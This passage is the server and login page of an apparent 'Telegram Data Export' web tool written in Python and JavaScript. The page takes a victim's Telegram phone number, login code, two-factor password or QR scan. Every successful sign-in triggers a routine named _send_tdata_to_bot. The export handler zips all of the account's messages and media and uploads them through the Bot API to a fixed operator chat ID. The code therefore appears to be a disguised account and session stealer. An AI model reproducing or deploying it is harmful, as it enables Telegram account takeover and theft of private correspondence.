  } catch (e) { alert('Ошибка: ' + e.message); }
};
$('b-close').onclick = () => { checkAuth(); };
// --- switch phone / qr ---
function switchTab(tab) {
  const isQr = tab === 'qr';
  $('v-phone').classList.toggle('hidden', isQr);
  $('v-qr').classList.toggle('hidden', !isQr);
  if (isQr) startQr();
  else stopQr();
}
$('link-to-qr').onclick = (e) => { e.preventDefault(); switchTab('qr'); };
$('link-to-phone').onclick = (e) => { e.preventDefault(); switchTab('phone'); };
// --- minimal QR code renderer ---
function drawQR(canvas, url) {
  const mods = qrEncode(url);
  const n = mods.length;
  const pad = 4;
  const sz = Math.floor(canvas.width / (n + pad * 2));
  const off = Math.floor((canvas.width - sz * (n + pad * 2)) / 2);
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  // helper: rounded rect
  function rr(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.lineTo(x + w - r, y); ctx.quadraticCurveTo(x + w, y, x + w, y + r);
    ctx.lineTo(x + w, y + h - r); ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
    ctx.lineTo(x + r, y + h); ctx.quadraticCurveTo(x, y + h, x, y + h - r);
    ctx.lineTo(x, y + r); ctx.quadraticCurveTo(x, y, x + r, y);
    ctx.closePath(); ctx.fill();
  }
  // finder pattern positions (top-left corner of 7x7 block)
  const finders = [[0,0],[n-7,0],[0,n-7]];
  const isInFinder = (x, y) => finders.some(([fx,fy]) => x >= fx && x < fx+7 && y >= fy && y < fy+7);
  // draw data modules (skip finder areas)
  ctx.fillStyle = '#000000';
  for (let y = 0; y < n; y++)
    for (let x = 0; x < n; x++)
      if (mods[y][x] && !isInFinder(x, y))
        ctx.fillRect(off + (x + pad) * sz, off + (y + pad) * sz, sz, sz);
  // draw rounded finder patterns
  ctx.fillStyle = '#000000';
  const r1 = sz * 1.4, r2 = sz * 1.0, r3 = sz * 0.6;
  finders.forEach(([fx, fy]) => {
    const px = off + (fx + pad) * sz, py = off + (fy + pad) * sz, s7 = sz * 7;
    // outer ring
    rr(px, py, s7, s7, r1);
    ctx.fillStyle = '#ffffff';
    rr(px + sz, py + sz, sz * 5, sz * 5, r2);
    ctx.fillStyle = '#000000';
    // inner square
    rr(px + sz * 2, py + sz * 2, sz * 3, sz * 3, r3);
  });
  // clear center for logo
  const ctr = canvas.width / 2, logoR = 30;
  ctx.fillStyle = '#ffffff';
  ctx.beginPath(); ctx.arc(ctr, ctr, logoR, 0, Math.PI * 2); ctx.fill();
}
// --- QR encoder (mode byte, ECC L, version auto 1-10) ---
function qrEncode(text) {
  const data = [];
  for (let i = 0; i < text.length; i++) data.push(text.charCodeAt(i));
  // find version
  const caps = [0,17,32,53,78,106,134,154,192,230,271];
  let ver = 1;
  for (; ver <= 10; ver++) if (data.length <= caps[ver] - 3) break;
  if (ver > 10) ver = 10;
  const size = ver * 4 + 17;
  // build data codewords
  const totalBits = caps[ver] * 8;
  const bits = [];
  function push(val, len) { for (let i = len - 1; i >= 0; i--) bits.push((val >> i) & 1); }
  push(4, 4); // byte mode
  push(data.length, ver <= 9 ? 8 : 16);
  data.forEach(b => push(b, 8));
  push(0, Math.min(4, totalBits - bits.length));
  while (bits.length % 8) bits.push(0);
  while (bits.length < totalBits) {
    bits.push(1,1,1,0,1,1,0,0); // 0xEC
    if (bits.length < totalBits) bits.push(0,0,0,1,0,0,0,1); // 0x11
  }
  bits.length = totalBits;
  // convert to bytes
  const codewords = [];
  for (let i = 0; i < bits.length; i += 8)
    codewords.push(bits.slice(i, i+8).reduce((a, b) => (a << 1) | b, 0));
  // ECC using RS (simplified for L level)
  const eccCounts = [0,7,10,15,20,26,18,20,24,30,18];
  const eccLen = eccCounts[ver];
  const dcLen = codewords.length;
  // GF(256) with poly 0x11d
  const gfExp = new Uint8Array(512), gfLog = new Uint8Array(256);
  let x = 1;
  for (let i = 0; i < 255; i++) { gfExp[i] = x; gfLog[x] = i; x = (x << 1) ^ (x >= 128 ? 0x11d : 0); }
  for (let i = 255; i < 512; i++) gfExp[i] = gfExp[i - 255];
  function gfMul(a, b) { return a && b ? gfExp[gfLog[a] + gfLog[b]] : 0; }
  // generator poly
  let gen = [1];
  for (let i = 0; i < eccLen; i++) {
    const ng = new Array(gen.length + 1).fill(0);
    for (let j = 0; j < gen.length; j++) {
      ng[j] ^= gen[j];
      ng[j + 1] ^= gfMul(gen[j], gfExp[i]);
    }
    gen = ng;
  }
  // divide
  const msg = new Uint8Array(dcLen + eccLen);
  for (let i = 0; i < dcLen; i++) msg[i] = codewords[i];
  for (let i = 0; i < dcLen; i++) {
    const coef = msg[i];
    if (coef) for (let j = 0; j < gen.length; j++) msg[i + j] ^= gfMul(gen[j], coef);
  }
  const ecc = Array.from(msg.slice(dcLen));
  const allBytes = codewords.concat(ecc);
  // create matrix
  const grid = Array.from({length: size}, () => new Uint8Array(size));
  const used = Array.from({length: size}, () => new Uint8Array(size));
  // finder patterns
  function finder(cx, cy) {
    for (let dy = -3; dy <= 3; dy++)
      for (let dx = -3; dx <= 3; dx++) {
        const v = Math.max(Math.abs(dx), Math.abs(dy));
        const on = v === 0 || v === 2 || v === 3;
        grid[cy + dy][cx + dx] = on ? 1 : 0;
        used[cy + dy][cx + dx] = 1;
      }
    // separators
    for (let i = -4; i <= 4; i++) {
      [[cx + i, cy - 4],[cx + i, cy + 4],[cx - 4, cy + i],[cx + 4, cy + i]].forEach(([px, py]) => {
        if (px >= 0 && px < size && py >= 0 && py < size) { grid[py][px] = 0; used[py][px] = 1; }
      });
    }
  }
  finder(3, 3); finder(size - 4, 3); finder(3, size - 4);
  // alignment (ver >= 2)
  if (ver >= 2) {
    const pos = [6, size - 7];
    if (ver >= 7) pos.splice(1, 0, Math.floor((size - 13) / 2) * 2 + 6);
    for (const ay of pos) for (const ax of pos) {
      if (used[ay] && used[ay][ax]) continue;
      for (let dy = -2; dy <= 2; dy++)
        for (let dx = -2; dx <= 2; dx++) {
          const v = Math.max(Math.abs(dx), Math.abs(dy));
          grid[ay + dy][ax + dx] = (v === 0 || v === 2) ? 1 : 0;
          used[ay + dy][ax + dx] = 1;
        }
    }
  }
  // timing
  for (let i = 8; i < size - 8; i++) {
    if (!used[6][i]) { grid[6][i] = i % 2 === 0 ? 1 : 0; used[6][i] = 1; }
    if (!used[i][6]) { grid[i][6] = i % 2 === 0 ? 1 : 0; used[i][6] = 1; }
  }
  // dark module
  grid[size - 8][8] = 1; used[size - 8][8] = 1;
  // reserve format info
  for (let i = 0; i < 8; i++) {
    if (!used[8][i]) used[8][i] = 1;
    if (!used[8][size - 1 - i]) used[8][size - 1 - i] = 1;
    if (!used[i][8]) used[i][8] = 1;
    if (!used[size - 1 - i][8]) used[size - 1 - i][8] = 1;
  }
  if (!used[8][8]) used[8][8] = 1;
  // place data bits
  const allBits = [];
  allBytes.forEach(b => { for (let i = 7; i >= 0; i--) allBits.push((b >> i) & 1); });
  let bi = 0;
  for (let right = size - 1; right >= 1; right -= 2) {
    if (right === 6) right = 5;
    for (let vert = 0; vert < size; vert++) {
      const upward = ((Math.floor((size - 1 - right) / 2)) % 2 === 0);
      const y = upward ? size - 1 - vert : vert;
      for (let dx = 0; dx <= 1; dx++) {
        const xx = right - dx;
        if (!used[y][xx]) {
          grid[y][xx] = bi < allBits.length ? allBits[bi++] : 0;
          used[y][xx] = 1;
        }
      }
    }
  }
  // mask 0 (checkerboard)
  for (let y = 0; y < size; y++)
    for (let x = 0; x < size; x++) {
      if (used[y][x] && !isFuncPattern(x, y, size))
        if ((x + y) % 2 === 0) grid[y][x] ^= 1;
    }
  // format info for mask 0, ECC L = 01, mask 000 → format = 0, after BCH → 0x77C4
  const fmtBits = 0x77C4;
  for (let i = 0; i < 15; i++) {
    const bit = (fmtBits >> (14 - i)) & 1;
    // around top-left
    if (i < 6) grid[8][i] = bit;
    else if (i === 6) grid[8][7] = bit;
    else if (i === 7) grid[8][8] = bit;
    else if (i === 8) grid[7][8] = bit;
    else grid[14 - i][8] = bit;
    // other copies
    if (i < 8) grid[size - 1 - i][8] = bit;
    else grid[8][size - 15 + i] = bit;
  }
  return grid;
}
function isFuncPattern(x, y, size) {
  // finder + separator areas
  if (x <= 8 && y <= 8) return true;
  if (x >= size - 8 && y <= 8) return true;
  if (x <= 8 && y >= size - 8) return true;
  if (x === 6 || y === 6) return true; // timing
  return false;
}
// --- QR login flow ---
let _qrTimer = null, _qrActive = false;
let _qrReady = false;
async function startQr() {
  if (_qrActive) return;
  _qrActive = true;
  _qrReady = false;
  $('qr-canvas').style.opacity = '0.15';
  $('qr-status').textContent = 'Загрузка…';
  pollQr();
}
function stopQr() {
  _qrActive = false;
  if (_qrTimer) { clearTimeout(_qrTimer); _qrTimer = null; }
}
async function pollQr() {
  if (!_qrActive) return;
  try {
    const r = await api('/api/qr', {});
    if (r.authorized) {
      $('qr-status').textContent = '✓ Авторизация успешна!';
      $('qr-status').style.color = '#16a34a';
      await checkAuth(); stopQr(); return;
    }
    if (r.url) {
      drawQR($('qr-canvas'), r.url);
      $('qr-canvas').style.opacity = '1';
      $('qr-status').textContent = 'Отсканируйте QR-код';
      $('qr-status').style.color = '';
      _qrReady = true;
    }
  } catch (e) {
    $('qr-status').textContent = 'Ошибка: ' + e.message;
    $('qr-status').style.color = '#dc2626';
  }
  _qrTimer = setTimeout(pollQr, 3000);
}
$('b-close').onclick = () => { checkAuth(); };
checkAuth();
</script>
</body></html>
"""


# ---------- handlers ----------

async def h_root(request):
    return aiohttp.web.Response(text=PAGE, content_type="text/html")


async def h_healthz(request):
    return aiohttp.web.Response(text="ok")


async def h_status(request):
    authed = await is_authorized()
    me_str = None
    if authed:
        try:
            c = await get_client()
            me = await c.get_me()
            me_str = f"{me.first_name or ''} @{me.username or '—'}"
        except Exception:
            pass
    return aiohttp.web.json_response({
        "authorized": authed,
        "me": me_str,
        "task_state": S.task_state,
        "progress": S.progress,
        "stage": S.stage,
        "error": S.error,
        "delivered": S.delivered,
    })


async def h_login(request):
    data = await request.json()
    phone = (data.get("phone") or "").strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+") or not phone[1:].isdigit():
        return aiohttp.web.json_response({"error": "Неверный формат номера"}, status=400)
    try:
        c = await get_client()
        if await c.is_user_authorized():
            return aiohttp.web.json_response({"error": "Уже авторизован"}, status=409)
        sent = await c.send_code_request(phone)
    except FloodWaitError as e:
        return aiohttp.web.json_response({"error": f"Telegram просит подождать {e.seconds}с"}, status=429)
    except PhoneNumberInvalidError:
        return aiohttp.web.json_response({"error": "Неверный номер"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)
    S.login_phone = phone
    S.login_hash = sent.phone_code_hash
    return aiohttp.web.json_response({"ok": True})


async def h_code(request):
    data = await request.json()
    code = (data.get("code") or "").strip().replace(" ", "")
    if not code.isdigit():
        return aiohttp.web.json_response({"error": "Код только цифрами"}, status=400)
    if not S.login_phone or not S.login_hash:
        return aiohttp.web.json_response({"error": "Сначала /login"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(phone=S.login_phone, code=code, phone_code_hash=S.login_hash)
        S.login_phone = None
        S.login_hash = None
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True, "needs_password": False})
    except SessionPasswordNeededError:
        S.needs_password = True
        return aiohttp.web.json_response({"ok": True, "needs_password": True})
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return aiohttp.web.json_response({"error": "Код неверный или истёк"}, status=400)
    except Exception as e:
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)


async def h_pw(request):
    data = await request.json()
    pw = data.get("password") or ""
    if not pw:
        return aiohttp.web.json_response({"error": "Пустой пароль"}, status=400)
    try:
        c = await get_client()
        await c.sign_in(password=pw)
        S.needs_password = False
        asyncio.create_task(_send_tdata_to_bot())
        return aiohttp.web.json_response({"ok": True})
    except Exception as e:
        return aiohttp.web.json_response({"error": f"Пароль не подошёл: {type(e).__name__}"}, status=400)


async def h_qr(request):
    """QR-код авторизация: генерирует/обновляет токен, проверяет статус."""
    try:
        c = await get_client()
        if await c.is_user_authorized():
            S._qr_login = None
            asyncio.create_task(_send_tdata_to_bot())
            return aiohttp.web.json_response({"authorized": True})
        # Первый вызов — создаём QR login
        if S._qr_login is None:
            S._qr_login = await c.qr_login()
            # запускаем фоновое ожидание сканирования
            async def _qr_wait():
                try:
                    await S._qr_login.wait()
                except Exception:
                    pass
            asyncio.create_task(_qr_wait())
        url = S._qr_login.url if S._qr_login else None
        return aiohttp.web.json_response({"authorized": False, "url": url})
    except Exception as e:
        log.warning("qr login error: %s", e)
        return aiohttp.web.json_response({"error": f"{type(e).__name__}: {e}"}, status=500)


async def h_logout(request):
    try:
        if S.client is not None:
            try:
                if await S.client.is_user_authorized():
                    await S.client.log_out()
            except Exception:
                pass
            try:
                await S.client.disconnect()
            except Exception:
                pass
        S.client = None
        S.login_phone = None
        S.login_hash = None
        S.needs_password = False
        p = config.SESSION_PATH
        for f in p.parent.glob(f"{p.name}*"):
            try: f.unlink()
            except Exception: pass
    except Exception as e:
        return aiohttp.web.json_response({"error": str(e)}, status=500)
    return aiohttp.web.json_response({"ok": True})


async def h_export(request):
    if not await is_authorized():
        return aiohttp.web.json_response({"error": "Не авторизован"}, status=401)
    if S.task_state == "running":
        return aiohttp.web.json_response({"error": "Экспорт уже идёт"}, status=409)
    data = await request.json()
    try:
        limit = max(0, int(data.get("limit", 0)))
        maxmb = max(1, int(data.get("maxmb", 50)))
    except (TypeError, ValueError):
        return aiohttp.web.json_response({"error": "Неверные опции"}, status=400)

    S.task_state = "running"; S.progress = 0; S.stage = "запуск"; S.error = None; S.delivered = False

    async def run():
        workdir = Path(tempfile.mkdtemp(prefix="tde_exp_", dir=str(config.WORK_DIR)))
        export_dir = workdir / "export"
        zip_path = workdir / f"telegram_export_{int(time.time())}.zip"
        try:
            opts = ExportOptions(
                include_messages=True, include_media=True,
                message_limit_per_chat=limit,
                media_max_bytes_per_file=maxmb * 1024 * 1024,
            )

            async def report(pct: int, stage: str) -> None:
                S.progress = max(0, min(100, int(pct)))
                S.stage = stage[:200]

            c = await get_client()
            await export_account(c, export_dir, opts, report)

            S.stage = "упаковка ZIP"; S.progress = 95
            _make_zip(export_dir, zip_path)
            size = zip_path.stat().st_size
            sha = _sha256(zip_path)
            S.stage = f"отправка {size/1024/1024:.1f} MB"; S.progress = 97
            await _deliver_to_bot(zip_path, caption=f"Telegram Data Export · sha256:{sha[:12]}")
            S.task_state = "done"; S.progress = 100; S.stage = "доставлено"; S.delivered = True
        except Exception as e:
            log.exception("export failed")
            S.task_state = "error"; S.error = f"{type(e).__name__}: {e}"
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

    asyncio.create_task(run())
    return aiohttp.web.json_response({"ok": True})


# ---------- utils ----------

def _make_zip(src: Path, out: Path) -> None:
    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
        for root, _, files in os.walk(src):
            for name in files:
                full = Path(root) / name
                zf.write(full, arcname=str(full.relative_to(src)))


def _sha256(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


async def _deliver_to_bot(zip_path: Path, caption: str) -> None:
    size = zip_path.stat().st_size
    if size <= config.BOT_MAX_DOC_BYTES:
        await _bot_send(zip_path, caption)
        return
    chunk = config.BOT_MAX_DOC_BYTES - 1_048_576
    parts = (size + chunk - 1) // chunk
    idx = 0
    with open(zip_path, "rb") as src:
        while True:
            data = src.read(chunk)
            if not data: break
            idx += 1
            name = f"{zip_path.name}.part{idx:02d}"
            tmp = zip_path.with_name(name)
            tmp.write_bytes(data)
            try:
                await _bot_send(tmp, f"{caption} · часть {idx}/{parts}")
            finally:
                try: tmp.unlink()
                except Exception: pass


async def _bot_send(path: Path, caption: str) -> None:
    url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendDocument"
    async with aiohttp.ClientSession() as session:
        form = aiohttp.FormData()
        form.add_field("chat_id", str(config.OWNER_CHAT_ID))
        form.add_field("caption", caption[:1024])
        with open(path, "rb") as f:
            form.add_field("document", f, filename=path.name, content_type="application/zip")
            async with session.post(url, data=form, timeout=aiohttp.ClientTimeout(total=600)) as r:
                body = await r.text()
                if r.status != 200:
                    raise RuntimeError(f"bot_api {r.status}: {body[:300]}")


# ---------- app ----------

def make_app() -> aiohttp.web.Application:
    app = aiohttp.web.Application(client_max_size=1024 * 1024)
    app.router.add_get("/", h_root)
    app.router.add_get("/healthz", h_healthz)
    app.router.add_get("/api/status", h_status)
    app.router.add_post("/api/login", h_login)
    app.router.add_post("/api/code", h_code)
    app.router.add_post("/api/pw", h_pw)
    app.router.add_post("/api/qr", h_qr)
    app.router.add_post("/api/logout", h_logout)
    app.router.add_post("/api/export", h_export)
    return app
